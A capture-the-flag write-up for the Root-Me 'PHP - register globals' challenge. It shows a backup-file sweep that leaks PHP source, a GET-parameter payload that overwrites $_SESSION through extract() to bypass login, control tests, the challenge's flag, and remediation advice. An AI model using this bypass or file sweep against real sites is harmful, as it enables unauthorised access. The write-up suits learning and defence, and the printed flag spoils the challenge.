# Root-Me — Web-Server: "PHP - register globals" (ch17)

**Target:** http://challenge01.root-me.org/web-serveur/ch17/
**Author:** g0uZ · **Points:** 25
**Hint:** *"It seems that the developer often leaves backup files around..."*

## Result

```
VALIDATION PASSWORD: NoTQYipcRKkgrqG
```

Reproduced from multiple independent sessions — the value is the application's real
`$hidden_password`, not an injected one.

## Step 1 — Source disclosure

The hint points at leftover backup files. A short filename sweep found one:

```bash
curl -s "http://challenge01.root-me.org/web-serveur/ch17/index.php.bak"
```

```
index.php.bak       -> 200  1400 bytes   <-- leaked source
index.php~          -> 404
index.php.old       -> 404
index.php.swp       -> 404
.index.php.swp      -> 403
index.php.save      -> 404
index.php.orig      -> 404
```

`.bak` is served as plain text by nginx, so the full PHP source is readable.

## Step 2 — Auditing the source

The interesting part of `index.php.bak`:

```php
include("config.inc.php");          // defines $hidden_password

if (isset($_POST["password"]))
    $password = $_POST["password"];

if (!ini_get('register_globals')) {
    $superglobals = array($_SERVER, $_ENV, $_FILES, $_COOKIE, $_POST, $_GET);
    if (isset($_SESSION)) {
        array_unshift($superglobals, $_SESSION);
    }
    foreach ($superglobals as $superglobal) {
        extract($superglobal, 0 );     // 0 == EXTR_OVERWRITE
    }
}

if (( isset($password) && $password!="" && auth($password,$hidden_password)==1)
    || (is_array($_SESSION) && $_SESSION["logged"]==1 ) ) {
    $aff = display("well done, you can validate with the password : $hidden_password");
} else {
    $aff = display("try again");
}
```

The developer emulated the removed `register_globals` feature by running `extract()`
over every superglobal. Two properties make this exploitable:

1. **`0` is `EXTR_OVERWRITE`** — every extracted key clobbers the existing local
   variable of the same name.
2. **`$_GET` is extracted last**, so it wins over `$_POST`, `$_COOKIE`, `$_FILES`,
   `$_ENV` and `$_SERVER`.

Because `extract()` runs at global scope, it can also overwrite the **superglobals
themselves** — including `$_SESSION`.

## Step 3 — Choosing the right variable to overwrite

The obvious move is to overwrite the secret itself:

```
?password=x&hidden_password=x
```

This *does* satisfy `auth()`, but the success message interpolates `$hidden_password` —
which is now *our* value. It prints `x`. Useless for recovering the real password.

The correct move is to overwrite `$_SESSION` instead, leaving `$hidden_password`
untouched, and take the second branch of the condition:

```
GET /web-serveur/ch17/?_SESSION[logged]=1
```

`extract($_GET)` turns the `_SESSION` key into a local variable, replacing the real
session array with `['logged' => '1']`. The check
`is_array($_SESSION) && $_SESSION["logged"]==1` then passes, and the genuine
`$hidden_password` is interpolated into the success message.

> **URL-encoding matters.** Use `?_SESSION%5Blogged%5D=1`, or pass `curl -g`.
> With unencoded `[` `]`, curl treats them as glob metacharacters and the request
> returns an empty response.

## Step 4 — Proof the mechanism is what we think it is

Control tests, to rule out a lucky coincidence:

| Request | Response | What it proves |
|---|---|---|
| `?_SESSION[logged]=1` | `password : NoTQYipcRKkgrqG` | the bypass works |
| `?_SESSION[logged]=0` | `try again` | the **value** is what matters |
| `?_SESSION[foo]=1` | `try again` | the **key** must be `logged` |
| `?_SESSION=abc` | `try again` | `is_array()` must hold |
| `?_SESSION[logged][]=1` | `try again` | loose `== 1` needs a scalar |
| *(no params)* | `try again` | baseline |

Together these show the app is reading an attacker-supplied `$_SESSION` array —
i.e. `extract()` really did clobber the superglobal.

## Remediation

- **Delete backup files from the webroot.** `index.php.bak`, `.old`, `.save`, `~`,
  `.swp` and friends must never be reachable. Block these patterns at the web-server
  level as defence in depth.
- **Never call `extract()` on user input.** It is one of the most dangerous functions
  in PHP for exactly this reason.
- If extraction is unavoidable, use `EXTR_SKIP` (never `EXTR_OVERWRITE`) and reject
  keys that collide with internal variables or superglobals.
- Do not hand-roll a `register_globals` emulation — it reintroduces a vulnerability
  class PHP deliberately removed in 5.4.
- Serve `.bak`/`.inc` files as `application/octet-stream` or deny them outright;
  `config.inc.php` being an `.inc` also risks serving secrets as plain text if the
  `.inc` extension is not mapped to the PHP handler.

## Notes on the environment

Reachability and exploitation confirmed from Windows Git Bash via the sandbox HTTP
proxy. No authentication was required for the challenge endpoint.
